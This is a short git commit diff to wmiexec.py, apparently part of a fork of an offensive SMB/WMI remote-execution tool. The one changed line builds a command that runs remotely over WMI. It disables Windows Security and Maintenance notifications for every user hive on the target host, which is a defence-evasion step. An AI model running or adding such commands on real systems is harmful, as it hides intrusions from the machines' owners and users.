585391e57b65a778945724d22668e7c07fa7fa0c
awsmhacks <ripr4p@gmail.com>
2019-08-25 16:05:27 -0500

    Update wmiexec.py

--- cmx/protocols/smb/wmiexec.py
+++ cmx/protocols/smb/wmiexec.py
@@ -162,7 +162,7 @@ class WMIEXEC:
         self.__smbconnection.deleteFile(self.__share, self.__output)
 
     def disable_notifications(self):
-        command = self.__shell + """"FOR /F %a IN ('REG.EXE QUERY hku 2^>NUL ^| FIND ^"HKEY_USERS^"') DO REG.EXE add ^"%a\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.SystemToast.SecurityAndMaintenance^" /v ^"Enabled^" /d ^"0^" /t REG_DWORD /F" """
+        command = """FOR /F %a IN ('REG.EXE QUERY hku 2^>NUL ^| FIND ^"HKEY_USERS^"') DO REG.EXE add ^"%a\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.SystemToast.SecurityAndMaintenance^" /v ^"Enabled^" /d ^"0^" /t REG_DWORD /F """
 
         logging.debug('notifications being disabling using: ' + command)
         self.__win32Process.Create(command, self.__pwd, None)
